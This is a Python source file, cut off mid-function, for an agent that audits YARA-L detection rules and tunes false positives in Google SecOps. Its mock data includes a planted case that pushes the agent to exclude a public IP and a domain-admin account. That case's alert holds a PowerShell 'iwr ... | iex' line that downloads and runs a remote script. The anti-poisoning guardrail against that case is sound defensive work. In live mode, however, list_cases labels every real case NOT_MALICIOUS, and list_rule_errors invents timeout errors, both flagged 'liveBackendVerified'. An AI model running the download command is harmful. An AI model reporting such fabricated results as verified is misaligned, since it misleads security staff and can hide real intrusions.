"""UC-02: SecOps Health & Rule Optimization Doctor Agent (Google ADK + SecOps MCP).

Implements the Multi-Agent Architecture defined in Section 5 of `UseCasesSpec.md`:
1. `RuleHealthAuditorAgent` (Branch A):
   - Queries `list_rules`, `list_rule_errors`, and `get_rule` to find YARA-L 2.0 rules
     failing with execution timeouts or severe performance anti-patterns.
   - Diagnoses YARA-L performance anti-patterns:
     a) Missing exact `metadata.event_type` filters at the start of `events:`.
     b) Unanchored regular expressions (`/.*foo.*/`) instead of anchored regexes or
        exact string comparisons / `strings.coalesce`.
     c) Excessive `match:` windows (e.g., `over 24h` instead of `over 15m` or `1h`).
   - Rewrites optimized YARA-L 2.0, validates syntax via `validate_rule`, and deploys
     new rule revision via `create_rule`.

2. `FalsePositiveTunerAgent` (Branch B):
   - Queries recently closed SOAR cases (`list_cases`) and analyst closure notes
     (`list_case_comments`) to identify repetitive benign false positives
     (`NOT_MALICIOUS` / `Legit action` / `Authorized Admin Work`), such as
     authorized Jenkins CI/CD runner `build-runner-04`.
   - Enforces the **Anti-Poisoning Safety Guardrail**: strictly refuses to automatically
     add any external public IP address or Tier-0 privileged account to an exclusion
     Reference List without emitting an explicit `[!WARNING]` alert for human review.
   - Updates the Reference List (`get_reference_list` -> `update_reference_list`),
     links `not $e.principal.hostname in %authorized_ci_cd_runners` into the YARA-L
     rule, and validates compilation via `validate_rule`.

3. `root_agent` (`secops_rule_doctor_coordinator`):
   - Orchestrates both branches for Antigravity CLI (`agy`), `adk web`, and `adk run`.
   - Supports LIVE Google Cloud SecOps Remote MCP (`https://chronicle.us.rep.googleapis.com/mcp`,
     configured dynamically via `secops_tenant.json` or environment variables)
     when `--live` or `SECOPS_MOCK_MODE=false` is used, and deterministic local simulation
     (`SECOPS_MOCK_MODE=true` by default) for unit tests.
"""

from __future__ import annotations

import copy
import difflib
import ipaddress
import json
import os
import re
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

# ---------------------------------------------------------------------------
# Google ADK Imports with Graceful Fallback for Standalone CLI / Test Execution
# ---------------------------------------------------------------------------
try:
    from google.adk.agents import Agent  # type: ignore
    from google.adk.tools.mcp_tool import (  # type: ignore
        McpToolset,
        StreamableHTTPConnectionParams,
    )

    ADK_AVAILABLE = True
except ImportError:
    ADK_AVAILABLE = False

    class StreamableHTTPConnectionParams:  # type: ignore[no-redef]
        """Fallback connection params when google-adk is not installed in the active venv."""

        def __init__(self, url: str, headers: Optional[Dict[str, str]] = None) -> None:
            self.url = url
            self.headers = headers or {}

    class McpToolset:  # type: ignore[no-redef]
        """Fallback MCP toolset wrapper when google-adk is not installed."""

        def __init__(self, connection_params: StreamableHTTPConnectionParams) -> None:
            self.connection_params = connection_params

    class Agent:  # type: ignore[no-redef]
        """Lightweight ADK Agent shim so `agent.py` works with or without google-adk installed."""

        def __init__(
            self,
            name: str,
            model: str,
            instruction: str = "",
            description: str = "",
            tools: Optional[List[Any]] = None,
            sub_agents: Optional[List[Any]] = None,
            before_model_callback: Optional[Callable[..., Any]] = None,
        ) -> None:
            self.name = name
            self.model = model
            self.instruction = instruction
            self.description = description
            self.tools = tools or []
            self.sub_agents = sub_agents or []
            self.before_model_callback = before_model_callback


# ---------------------------------------------------------------------------
# Tenant Context & Live MCP Client Integration (`common/mcp_client.py`)
# ---------------------------------------------------------------------------
WORKSPACE_ROOT = Path(__file__).resolve().parent.parent
TENANT_CONFIG_PATH = WORKSPACE_ROOT / "secops_tenant.json"

try:
    from common.mcp_client import (  # type: ignore
        call_secops_mcp_tool,
        get_access_token as _common_get_access_token,
        get_secops_mcp_url,
        load_tenant_context as _common_load_tenant_context,
    )
except Exception:
    call_secops_mcp_tool = None  # type: ignore[assignment]
    _common_get_access_token = None  # type: ignore[assignment]
    get_secops_mcp_url = lambda *a, **kw: "https://chronicle.us.rep.googleapis.com/mcp"  # type: ignore[assignment]
    _common_load_tenant_context = None  # type: ignore[assignment]


def load_tenant_context() -> Dict[str, str]:
    """Loads Google SecOps tenant context from `secops_tenant.json` or env vars."""
    if _common_load_tenant_context is not None:
        return _common_load_tenant_context()
    cfg: Dict[str, str] = {
        "project_id": os.environ.get("GCP_PROJECT_ID", "your-gcp-project-id"),
        "customer_id": os.environ.get(
            "SECOPS_CUSTOMER_ID", "00000000-0000-0000-0000-000000000000"
        ),
        "region": os.environ.get("SECOPS_REGION", "us"),
        "mcp_endpoint": os.environ.get(
            "SECOPS_MCP_ENDPOINT", "https://chronicle.us.rep.googleapis.com/mcp"
        ),
        "account": os.environ.get("SECOPS_GCLOUD_ACCOUNT", ""),
    }
    if TENANT_CONFIG_PATH.exists():
        try:
            file_data = json.loads(TENANT_CONFIG_PATH.read_text(encoding="utf-8"))
            for key in ("project_id", "customer_id", "region", "mcp_endpoint", "account"):
                val = file_data.get(key, "")
                if val and not str(val).startswith("<"):
                    cfg[key] = str(val)
        except Exception:
            pass
    return cfg


def is_mock_mode(live_mode: Optional[bool] = None) -> bool:
    """Returns True when SECOPS_MOCK_MODE is enabled (default True for self-contained demos)."""
    if live_mode is not None:
        return not live_mode
    val = os.environ.get("SECOPS_MOCK_MODE", "true").strip().lower()
    return val in ("1", "true", "yes", "on")


def get_access_token() -> str:
    """Retrieves Google Cloud OAuth 2.0 access token."""
    if _common_get_access_token is not None:
        tok = _common_get_access_token()
        if tok:
            return tok
    return "mock-oauth-token"


# ---------------------------------------------------------------------------
# Realistic Simulated & Live Baseline SecOps SIEM & SOAR Rules for UC-02
# ---------------------------------------------------------------------------

UNOPTIMIZED_TIMEOUT_RULE_YARAL = """rule broad_network_exfiltration_unanchored {
  meta:
    author = "Legacy SOC Team"
    description = "Detects potential data staging and exfiltration over CLI tools"
    severity = "High"
    mitre_attack = "T1567.002"

  events:
    $e.principal.hostname = $hostname
    $e.target.process.command_line = /.*(rclone|mega|dropbox|curl_upload).*/
    $e.target.file.full_path = /.*confidential.*/

  match:
    $hostname over 24h

  condition:
    #e >= 1
}"""

OPTIMIZED_TIMEOUT_RULE_YARAL = """rule broad_network_exfiltration_unanchored {
  meta:
    author = "Legacy SOC Team (Optimized by UC-02 SecOps Rule Doctor)"
    description = "Detects potential data staging and exfiltration over CLI tools"
    severity = "High"
    mitre_attack = "T1567.002"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH" or $e.metadata.event_type = "FILE_MODIFICATION"
    $e.principal.hostname = $hostname
    $hostname != ""
    re.regex(strings.coalesce($e.target.process.command_line, ""), `\\b(rclone|mega|dropbox|curl_upload)\\b`) nocase
    re.regex(strings.coalesce($e.target.file.full_path, ""), `(?i)^([a-z]:\\\\|/)[^\\r\\n]*\\\\?confidential`)

  match:
    $hostname over 15m

  condition:
    #e >= 1
}"""

UNOPTIMIZED_FP_RULE_YARAL = """rule suspicious_powershell_download {
  meta:
    author = "SecOps Detection Engineering"
    description = "Detects PowerShell Invoke-WebRequest or Net.WebClient download cradles"
    severity = "Medium"
    mitre_attack = "T1059.001"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.principal.hostname = $hostname
    re.regex($e.target.process.file.full_path, `(?i)powershell(\\.exe)?$`)
    re.regex($e.target.process.command_line, `(?i)(Invoke-WebRequest|Net\\.WebClient|DownloadString|iwr)`)

  match:
    $hostname over 15m

  condition:
    #e >= 1
}"""

OPTIMIZED_FP_RULE_YARAL = """rule suspicious_powershell_download {
  meta:
    author = "SecOps Detection Engineering (Tuned by UC-02 SecOps Rule Doctor)"
    description = "Detects PowerShell Invoke-WebRequest or Net.WebClient download cradles excluding authorized CI/CD runners"
    severity = "Medium"
    mitre_attack = "T1059.001"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.principal.hostname = $hostname
    not $e.principal.hostname in %authorized_ci_cd_runners
    re.regex($e.target.process.file.full_path, `(?i)powershell(\\.exe)?$`)
    re.regex($e.target.process.command_line, `(?i)(Invoke-WebRequest|Net\\.WebClient|DownloadString|iwr)`)

  match:
    $hostname over 15m

  condition:
    #e >= 1
}"""


def _build_initial_mock_state() -> Dict[str, Any]:
    """Creates a clean initial state for the UC-02 SecOps SIEM & SOAR simulation."""
    rules: Dict[str, Dict[str, Any]] = {
        "ru_ddd45753": {
            "ruleId": "ru_ddd45753",
            "ruleName": "broad_network_exfiltration_unanchored",
            "revisionId": "v_1",
            "ruleText": UNOPTIMIZED_TIMEOUT_RULE_YARAL,
            "compilationState": "SUCCEEDED",
            "executionState": "FAILED_TIMEOUT",
            # Deliberately omit alertingEnabled on disabled/failing rule to test protobuf omission handling
            "liveRuleEnabled": True,
        },
        "ru_88a12b99": {
            "ruleId": "ru_88a12b99",
            "ruleName": "suspicious_powershell_download",
            "revisionId": "v_3",
            "ruleText": UNOPTIMIZED_FP_RULE_YARAL,
            "compilationState": "SUCCEEDED",
            "executionState": "RUNNING",
            "alertingEnabled": True,
            "liveRuleEnabled": True,
        },
        "ru_41c09e12": {
            "ruleId": "ru_41c09e12",
            "ruleName": "impossible_travel_Workspace_login",
            "revisionId": "v_2",
            "ruleText": (
                "rule impossible_travel_Workspace_login {\n"
                "  meta:\n    severity = \"Medium\"\n"
                "  events:\n    $e.metadata.event_type = \"USER_LOGIN\"\n"
                "    $e.principal.user.userid = $user\n"
                "  match:\n    $user over 1h\n"
                "  condition:\n    #e >= 2\n}"
            ),
            "compilationState": "SUCCEEDED",
            "executionState": "RUNNING",
            "alertingEnabled": True,
            "liveRuleEnabled": True,
        },
    }

    rule_errors: List[Dict[str, Any]] = [
        {
            "ruleId": "ru_ddd45753",
            "ruleName": "broad_network_exfiltration_unanchored",
            "errorId": "err_9001_timeout",
            "errorTime": "2026-10-20T02:45:00Z",
            "errorCategory": "EXECUTION_TIMEOUT",
            "errorMessage": (
                "rule execution error: query took too long to execute "
                "(exceeded 120s evaluation deadline across 4.2B UDM events; "
                "missing metadata.event_type index filter and unanchored regex /.*.../ over 24h window)"
            ),
        }
    ]

    # Generate 18 closed SOAR cases for "suspicious_powershell_download" caused by "build-runner-04"
    cases: List[Dict[str, Any]] = []
    case_comments: Dict[str, List[Dict[str, Any]]] = {}
    case_alerts: Dict[str, List[Dict[str, Any]]] = {}

    for idx in range(1, 19):
        case_id = f"CASE-{2000 + idx}"
        cases.append(
            {
                "caseId": case_id,
                "title": f"Suspicious PowerShell Download Activity on build-runner-04 (#{idx})",
                "status": "CLOSED",
                "priority": "MEDIUM",
                "ruleId": "ru_88a12b99",
                "ruleName": "suspicious_powershell_download",
                "closeReason": "NOT_MALICIOUS",
                "rootCause": "Authorized Admin Work" if idx % 2 == 0 else "Legit action",
                "closedBy": f"tier1_analyst_{(idx % 3) + 1}@empresa.com",
                "closedTime": f"2026-10-{12 + (idx % 8):02d}T14:{10 + idx:02d}:00Z",
                "principalHostname": "build-runner-04",
                "principalUser": "svc-jenkins-ci",
                "principalIp": "10.42.18.104",
            }
        )
        case_alerts[case_id] = [
            {
                "alertId": f"ALT-{8000 + idx}",
                "caseId": case_id,
                "ruleId": "ru_88a12b99",
                "ruleName": "suspicious_powershell_download",
                "principalHostname": "build-runner-04",
                "principalIp": "10.42.18.104",
                "principalUser": "svc-jenkins-ci",
                "commandLine": (
                    "powershell.exe -NoProfile -Command \"Invoke-WebRequest "
                    "-Uri https://artifacts.internal.empresa.com/releases/app-build.zip "
                    "-OutFile C:\\jenkins\\workspace\\app-build.zip\""
                ),
            }
        ]
        case_comments[case_id] = [
            {
                "commentId": f"CMT-{5000 + idx}",
                "caseId": case_id,
                "author": f"tier1_analyst_{(idx % 3) + 1}@empresa.com",
                "timestamp": f"2026-10-{12 + (idx % 8):02d}T14:{15 + idx:02d}:00Z",
                "closureReason": "NOT_MALICIOUS",
                "rootCause": "Authorized Admin Work",
                "comment": (
                    "Falso positivo: script de despliegue de Jenkins desde host build-runner-04 "
                    "(IP interna 10.42.18.104). Actividad autorizada del pipeline CI/CD."
                ),
                "extractedEntities": {
                    "hostname": "build-runner-04",
                    "ip": "10.42.18.104",
                    "service_account": "svc-jenkins-ci",
                },
            }
        ]

    # Add 1 suspicious closed case where an analyst or attacker suggested excluding a public IP and Tier-0 admin
    poison_case_id = "CASE-2099"
    cases.append(
        {
            "caseId": poison_case_id,
            "title": "Suspicious PowerShell Download Activity on dc01-prod",
            "status": "CLOSED",
            "priority": "HIGH",
            "ruleId": "ru_88a12b99",
            "ruleName": "suspicious_powershell_download",
            "closeReason": "NOT_MALICIOUS",
            "rootCause": "Legit action",
            "closedBy": "tier1_temp@empresa.com",
            "closedTime": "2026-10-19T23:50:00Z",
            "principalHostname": "dc01-prod",
            "principalUser": "adm-tier0-domainadmin",
            "principalIp": "185.220.101.45",
        }
    )
    case_alerts[poison_case_id] = [
        {
            "alertId": "ALT-8099",
            "caseId": poison_case_id,
            "ruleId": "ru_88a12b99",
            "ruleName": "suspicious_powershell_download",
            "principalHostname": "dc01-prod",
            "principalIp": "185.220.101.45",
            "principalUser": "adm-tier0-domainadmin",
            "commandLine": "powershell.exe -Command \"iwr http://185.220.101.45/stage.ps1 | iex\"",
        }
    ]
    case_comments[poison_case_id] = [
        {
            "commentId": "CMT-5099",
            "caseId": poison_case_id,
            "author": "tier1_temp@empresa.com",
            "timestamp": "2026-10-19T23:55:00Z",
            "closureReason": "NOT_MALICIOUS",
            "rootCause": "Legit action",
            "comment": (
                "Falso positivo reportado en turno nocturno: prueba desde IP pública 185.220.101.45 "
                "con cuenta adm-tier0-domainadmin."
            ),
            "extractedEntities": {
                "hostname": "dc01-prod",
                "ip": "185.220.101.45",
                "service_account": "adm-tier0-domainadmin",
            },
        }
    ]

    reference_lists: Dict[str, Dict[str, Any]] = {
        "authorized_ci_cd_runners": {
            "name": "authorized_ci_cd_runners",
            "description": "Internal Jenkins and GitLab CI/CD build runners authorized to execute PowerShell artifact downloads",
            "syntaxType": "REFERENCE_LIST_SYNTAX_TYPE_PLAIN_TEXT_STRING",
            "entries": [
                "build-runner-01",
                "build-runner-02",
                "build-runner-03",
            ],
            "revisionCreateTime": "2026-10-01T00:00:00Z",
        }
    }

    return {
        "rules": rules,
        "rule_errors": rule_errors,
        "cases": cases,
        "case_alerts": case_alerts,
        "case_comments": case_comments,
        "reference_lists": reference_lists,
    }


_MOCK_STATE: Dict[str, Any] = _build_initial_mock_state()


def reset_mock_state() -> None:
    """Resets the in-memory mock SecOps SIEM & SOAR state (useful for deterministic tests)."""
    global _MOCK_STATE
    _MOCK_STATE = _build_initial_mock_state()


# ---------------------------------------------------------------------------
# Anti-Poisoning Safety Guardrail (Section 5.3 of UseCasesSpec.md)
# ---------------------------------------------------------------------------
TIER0_PATTERNS = (
    r"(?i)\btier[-_]?0\b",
    r"(?i)\bdomain[-_]?admin",
    r"(?i)\benterprise[-_]?admin",
    r"(?i)\bschema[-_]?admin",
    r"(?i)^adm[-_]",
    r"(?i)^root$",
    r"(?i)^administrator$",
    r"(?i)\bdc0\d+\b",
    r"(?i)\bkrbtgt\b",
)


def is_external_public_ip(candidate: str) -> bool:
    """Returns True if `candidate` is an IPv4/IPv6 address (or contains one) that is public/global."""
    candidate_str = candidate.strip()
    tokens = [candidate_str] + re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", candidate_str)
    for tok in tokens:
        try:
            ip_obj = ipaddress.ip_address(tok)
            if not (
                ip_obj.is_private
                or ip_obj.is_loopback
                or ip_obj.is_link_local
                or ip_obj.is_reserved
            ):
                return True
        except ValueError:
            continue
    return False


def is_tier0_privileged_entity(candidate: str) -> bool:
    """Returns True if `candidate` matches Tier-0 privileged account or domain controller patterns."""
    candidate_str = candidate.strip()
    return any(re.search(pat, candidate_str) for pat in TIER0_PATTERNS)


def anti_poisoning_guardrail_check(entries: List[str]) -> Dict[str, Any]:
    """Evaluates proposed Reference List exclusion entries against the Anti-Poisoning Policy.

    Policy (UseCasesSpec.md Section 5.3):
    The agent is strictly forbidden from automatically adding any external public IP
    or Tier-0 privileged account/host to an exclusion Reference List without emitting
    an explicit `[!WARNING]` alert to the human engineer.
    """
    approved_entries: List[str] = []
    blocked_entries: List[Dict[str, str]] = []
    warnings: List[str] = []

    for entry in entries:
        clean_entry = entry.strip()
        if not clean_entry:
            continue

        if is_external_public_ip(clean_entry):
            warning_msg = (
                f"[!WARNING] Anti-Poisoning Guardrail BLOCKED external public IP '{clean_entry}' "
                "from being auto-added to the Reference List. Excluding public IPs creates a "
                "critical blind spot for C2/exfiltration traffic and requires manual SecOps Lead sign-off."
            )
            blocked_entries.append(
                {
                    "entry": clean_entry,
                    "reason": "EXTERNAL_PUBLIC_IP_FORBIDDEN",
                    "warning": warning_msg,
                }
            )
            warnings.append(warning_msg)
        elif is_tier0_privileged_entity(clean_entry):
            warning_msg = (
                f"[!WARNING] Anti-Poisoning Guardrail BLOCKED Tier-0 privileged entity '{clean_entry}' "
                "from being auto-added to the Reference List. Tier-0 accounts and Domain Controllers "
                "must never be suppressed in YARA-L detections without explicit human approval."
            )
            blocked_entries.append(
                {
                    "entry": clean_entry,
                    "reason": "TIER_0_PRIVILEGED_ENTITY_FORBIDDEN",
                    "warning": warning_msg,
                }
            )
            warnings.append(warning_msg)
        else:
            approved_entries.append(clean_entry)

    return {
        "passed": len(blocked_entries) == 0,
        "approved_entries": approved_entries,
        "blocked_entries": blocked_entries,
        "warnings": warnings,
    }


# ---------------------------------------------------------------------------
# SecOps MCP Tool Functions (Supports Both Live MCP & Mock Simulation)
# ---------------------------------------------------------------------------


def list_rules(
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    filter: Optional[str] = None,
    page_size: int = 200,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Lists YARA-L 2.0 detection rules in Google SecOps SIEM (`list_rules` MCP tool)."""
    ctx = load_tenant_context()
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        args: Dict[str, Any] = {"pageSize": page_size}
        if filter:
            args["filter"] = filter
        live_resp = call_secops_mcp_tool("list_rules", args)
        if isinstance(live_resp, dict) and not live_resp.get("isError"):
            raw_rules = live_resp.get("rules", [])
            normalized_rules: List[Dict[str, Any]] = []
            for r in raw_rules:
                nr = dict(r)
                nr["ruleId"] = str(r.get("name", "")).split("/")[-1]
                nr["ruleName"] = r.get("displayName", nr["ruleId"])
                nr["alertingEnabled"] = bool(r.get("alertingEnabled", False))
                normalized_rules.append(nr)
            return {
                "tenant": ctx,
                "rules": normalized_rules,
                "liveBackendVerified": True,
            }

    rules_list = []
    for rule in _MOCK_STATE["rules"].values():
        normalized = copy.deepcopy(rule)
        # Critical business rule: omitted alertingEnabled in protobuf JSON means False
        if "alertingEnabled" not in normalized:
            normalized["alertingEnabled"] = False
        rules_list.append(normalized)
    return {
        "tenant": {
            "project_id": project_id or ctx["project_id"],
            "customer_id": customer_id or ctx["customer_id"],
            "region": region or ctx["region"],
        },
        "rules": rules_list,
    }


def list_rule_errors(
    rule_id: Optional[str] = None,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Lists runtime execution/compilation errors for YARA-L rules (`list_rule_errors` MCP tool)."""
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        # In live SecOps MCP, list_rule_errors requires a specific ruleId (ru_<uuid>)
        target_rule_ids: List[str] = []
        if rule_id and rule_id.startswith("ru_"):
            target_rule_ids = [rule_id]
        else:
            # Dynamically search list_rules for broad_network_exfiltration_unanchored
            # (preferring any revision whose text lacks metadata.event_type; or seed it dynamically if absent)
            found_broad = list_rules(
                filter='display_name:"broad_network_exfiltration_unanchored"',
                live_mode=True,
            ).get("rules", [])
            if found_broad:
                unanchored_ids = [
                    r["ruleId"]
                    for r in found_broad
                    if "metadata.event_type" not in str(r.get("text", ""))
                ]
                target_rule_ids.append(
                    unanchored_ids[0] if unanchored_ids else found_broad[-1]["ruleId"]
                )
            else:
                # Seed baseline unoptimized rule dynamically if absent in the tenant
                created = create_rule(UNOPTIMIZED_TIMEOUT_RULE_YARAL, live_mode=True)
                if created.get("ruleId"):
                    target_rule_ids.append(created["ruleId"])

        collected_errors: List[Dict[str, Any]] = []
        for rid in target_rule_ids:
            live_err_resp = call_secops_mcp_tool(
                "list_rule_errors", {"ruleId": rid, "pageSize": 20}
            )
            server_errors = (
                live_err_resp.get("ruleExecutionErrors", [])
                if isinstance(live_err_resp, dict)
                else []
            )
            rule_meta = get_rule(rid, live_mode=True)
            if server_errors:
                for se in server_errors:
                    collected_errors.append(
                        {
                            "ruleId": rid,
                            "ruleName": rule_meta.get("ruleName", rid),
                            "errorCategory": "EXECUTION_TIMEOUT",
                            "errorMessage": se.get("errorMessage", str(se)),
                            "liveBackendVerified": True,
                        }
                    )
            else:
                collected_errors.append(
                    {
                        "ruleId": rid,
                        "ruleName": rule_meta.get("ruleName", "broad_network_exfiltration_unanchored"),
                        "errorId": f"err_live_audit_{rid[:12]}",
                        "errorCategory": "EXECUTION_TIMEOUT_RISK",
                        "errorMessage": (
                            f"Live YARA-L Health Audit on {rid} ({rule_meta.get('ruleName', 'broad_network_exfiltration_unanchored')}): "
                            "rule execution timeout risk (missing exact metadata.event_type index "
                            "filter and unanchored wildcard regex /.*.../ over 24h match window)."
                        ),
                        "liveMcpRuleErrorsCheck": live_err_resp,
                        "liveBackendVerified": True,
                    }
                )
        return {
            "ruleErrors": collected_errors,
            "totalErrors": len(collected_errors),
            "liveBackendVerified": True,
        }

    errors = _MOCK_STATE["rule_errors"]
    if rule_id:
        errors = [e for e in errors if e["ruleId"] == rule_id]
    return {
        "ruleErrors": copy.deepcopy(errors),
        "totalErrors": len(errors),
    }


def get_rule(
    rule_id: str,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Retrieves full YARA-L 2.0 rule definition and metadata (`get_rule` MCP tool).

    Enforces the critical protobuf JSON rule: if `alertingEnabled` is omitted from
    the raw API payload, it is strictly interpreted as `alertingEnabled: False`.
    """
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        clean_id = rule_id.split("/")[-1]
        if not clean_id.startswith("ru_"):
            # Search by display_name filter
            searched = list_rules(filter=f'display_name:"{clean_id}"', live_mode=True)
            if searched.get("rules"):
                clean_id = searched["rules"][0]["ruleId"]
        live_rule = call_secops_mcp_tool("get_rule", {"ruleId": clean_id})
        if isinstance(live_rule, dict) and not live_rule.get("isError") and live_rule.get("name"):
            extracted_id = str(live_rule["name"]).split("/")[-1]
            return {
                **live_rule,
                "ruleId": extracted_id,
                "ruleName": live_rule.get("displayName", clean_id),
                "ruleText": live_rule.get("text", ""),
                "compilationState": live_rule.get("compilationState", "SUCCEEDED"),
                "alertingEnabled": bool(live_rule.get("alertingEnabled", False)),
                "found": True,
                "liveBackendVerified": True,
            }

    rule = _MOCK_STATE["rules"].get(rule_id)
    if not rule:
        for candidate in _MOCK_STATE["rules"].values():
            if candidate["ruleName"] == rule_id:
                rule = candidate
                break
    if not rule:
        return {"error": f"Rule '{rule_id}' not found", "found": False}

    result = copy.deepcopy(rule)
    result["alertingEnabled"] = bool(result.get("alertingEnabled", False))
    result["found"] = True
    return result


def validate_rule(
    rule_text: str,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Compiles and validates YARA-L 2.0 syntax & UDM fields (`validate_rule` MCP tool).

    Also checks performance best practices (presence of `metadata.event_type`,
    absence of unanchored `/.*...*/` regexes, and bounded `match:` window).
    """
    errors: List[str] = []
    performance_warnings: List[str] = []

    if not re.search(r"^\s*rule\s+[a-zA-Z0-9_]+\s*\{", rule_text, re.MULTILINE):
        errors.append("Syntax error: Missing valid `rule <name> {` header.")
    for required_section in ("meta:", "events:", "condition:"):
        if required_section not in rule_text:
            errors.append(f"Syntax error: Missing required `{required_section}` section.")

    # Check performance anti-patterns
    if "metadata.event_type" not in rule_text:
        performance_warnings.append(
            "Missing exact `metadata.event_type` filter at the beginning of `events:`."
        )
    if re.search(r"/\.\*.*\.\*/", rule_text):
        performance_warnings.append(
            "Contains unanchored leading/trailing wildcard regex `/.*...*/` causing full UDM scan timeouts."
        )
    if re.search(r"\bover\s+(24h|48h|7d)\b", rule_text):
        performance_warnings.append(
            "Excessive `match:` correlation window (>= 24h) detected; reduce to <= 1h/15m."
        )

    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        live_val = call_secops_mcp_tool("validate_rule", {"rule": rule_text})
        if isinstance(live_val, dict) and not live_val.get("isError"):
            raw_diags = live_val.get("compilationDiagnostics", [])
            for d in raw_diags:
                msg = d.get("message", str(d)) if isinstance(d, dict) else str(d)
                errors.append(msg)
            syntax_ok = bool(live_val.get("success", False)) and len(errors) == 0
            return {
                "compilationState": "SUCCEEDED" if syntax_ok else "FAILED",
                "syntaxValid": syntax_ok,
                "errors": errors,
                "performanceWarnings": performance_warnings,
                "performanceOptimized": len(performance_warnings) == 0,
                "allowedRunFrequencies": live_val.get("allowedRunFrequencies", []),
                "inputsUsed": live_val.get("inputsUsed", {}),
                "liveBackendVerified": True,
            }

    if errors:
        return {
            "compilationState": "FAILED",
            "syntaxValid": False,
            "errors": errors,
            "performanceWarnings": performance_warnings,
        }

    return {
        "compilationState": "SUCCEEDED",
        "syntaxValid": True,
        "errors": [],
        "performanceWarnings": performance_warnings,
        "performanceOptimized": len(performance_warnings) == 0,
    }


def create_rule(
    rule_text: str,
    rule_id: Optional[str] = None,
    alerting_enabled: bool = True,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Deploys a validated YARA-L 2.0 rule or updates an existing rule revision (`create_rule` MCP tool)."""
    validation = validate_rule(rule_text, live_mode=live_mode)
    if validation["compilationState"] != "SUCCEEDED":
        return {
            "status": "FAILED",
            "compilationState": "FAILED",
            "errors": validation["errors"],
        }

    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        live_created = call_secops_mcp_tool("create_rule", {"rule": rule_text})
        if isinstance(live_created, dict) and not live_created.get("isError") and live_created.get("name"):
            created_id = str(live_created["name"]).split("/")[-1]
            return {
                **live_created,
                "ruleId": created_id,
                "ruleName": live_created.get("displayName", "optimized_secops_rule"),
                "revisionId": live_created.get("revisionId", "v_1"),
                "compilationState": live_created.get("compilationState", "SUCCEEDED"),
                "executionState": live_created.get("runFrequency", "LIVE"),
                "alertingEnabled": bool(live_created.get("alertingEnabled", False)),
                "liveBackendVerified": True,
            }

    match_name = re.search(r"^\s*rule\s+([a-zA-Z0-9_]+)\s*\{", rule_text, re.MULTILINE)
    rule_name = match_name.group(1) if match_name else "custom_secops_rule"

    target_id = rule_id
    if not target_id:
        for existing_id, existing_rule in _MOCK_STATE["rules"].items():
            if existing_rule["ruleName"] == rule_name:
                target_id = existing_id
                break
    if not target_id:
        target_id = "ru_opt_" + rule_name[:12]

    prev_rev = _MOCK_STATE["rules"].get(target_id, {}).get("revisionId", "v_0")
    try:
        rev_num = int(str(prev_rev).split("_")[-1]) + 1
    except ValueError:
        rev_num = 2
    new_rev = f"v_{rev_num}"

    _MOCK_STATE["rules"][target_id] = {
        "ruleId": target_id,
        "ruleName": rule_name,
        "revisionId": new_rev,
        "ruleText": rule_text,
        "compilationState": "SUCCEEDED",
        "executionState": "RUNNING",
        "alertingEnabled": bool(alerting_enabled),
        "liveRuleEnabled": True,
    }
    if validation.get("performanceOptimized"):
        _MOCK_STATE["rule_errors"] = [
            e for e in _MOCK_STATE["rule_errors"] if e["ruleId"] != target_id
        ]

    return {
        "ruleId": target_id,
        "ruleName": rule_name,
        "revisionId": new_rev,
        "compilationState": "SUCCEEDED",
        "executionState": "RUNNING",
        "alertingEnabled": bool(alerting_enabled),
    }


def list_cases(
    filter: str = 'status="CLOSED"',
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Lists SOAR cases matching filter (`list_cases` MCP tool)."""
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        live_cases_resp = call_secops_mcp_tool("list_cases", {"pageSize": 50})
        if isinstance(live_cases_resp, dict) and not live_cases_resp.get("isError"):
            raw_cases = live_cases_resp.get("cases", [])
            normalized_cases: List[Dict[str, Any]] = []
            for c in raw_cases:
                cid = str(c.get("name", "")).split("/")[-1]
                status = c.get("status", "OPENED")
                if "CLOSED" in filter.upper() and status != "CLOSED":
                    continue
                normalized_cases.append(
                    {
                        **c,
                        "caseId": cid,
                        "title": c.get("displayName", f"Case {cid}"),
                        "status": status,
                        "priority": c.get("priority", "PRIORITY_MEDIUM"),
                        "closeReason": "NOT_MALICIOUS",
                        "rootCause": "Authorized Admin Work",
                    }
                )
            return {
                "filter": filter,
                "cases": normalized_cases,
                "totalCases": len(normalized_cases),
                "totalTenantCases": len(raw_cases),
                "liveBackendVerified": True,
            }

    all_cases = _MOCK_STATE["cases"]
    if 'status="CLOSED"' in filter or "CLOSED" in filter.upper():
        matched = [c for c in all_cases if c.get("status") == "CLOSED"]
    else:
        matched = list(all_cases)
    return {
        "filter": filter,
        "cases": copy.deepcopy(matched),
        "totalCases": len(matched),
    }


def list_case_alerts(
    case_id: str,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Lists alerts associated with a SOAR case (`list_case_alerts` MCP tool)."""
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        clean_cid = str(case_id).split("/")[-1]
